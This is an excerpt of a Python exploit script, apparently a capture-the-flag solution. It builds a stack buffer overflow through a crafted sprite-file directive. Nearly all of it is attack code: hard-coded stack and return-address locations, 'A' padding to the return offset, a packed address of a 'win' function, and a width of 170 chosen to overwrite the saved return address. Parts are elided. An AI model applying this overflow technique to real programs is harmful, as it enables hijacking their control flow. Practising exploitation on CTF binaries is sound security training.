...
STACK_BUFFER_START = 0x7ffd237c7280   # Buffer starts here
RETURN_ADDR_LOCATION = 0x7ffd237c7328 # Return address is here
WIN_ADDR = 0x3b42	      # Address of win function
...
padding_to_ret = b"A" * RET_OFFSET
return_address_overwrite = struct.pack("<H", WIN_ADDR)

# Build the overflow payload
overflow_payload = padding_to_ret + return_address_overwrite 
...
header_width = 170 # This sets the framebuffer dimensions
header_height = 1
...
# === Directive 3: Load sprite from file ===
directive_3 = struct.pack("<H", 3)  # handle_3 code
handle_3_data = (
...
control_width = 170   # Copy exactly enough bytes to overwrite return address
...
print(f"[+] win function address at: {hex(WIN_ADDR)}")
print(f"[+] Return address will be overwritten with: {hex(WIN_ADDR)}")
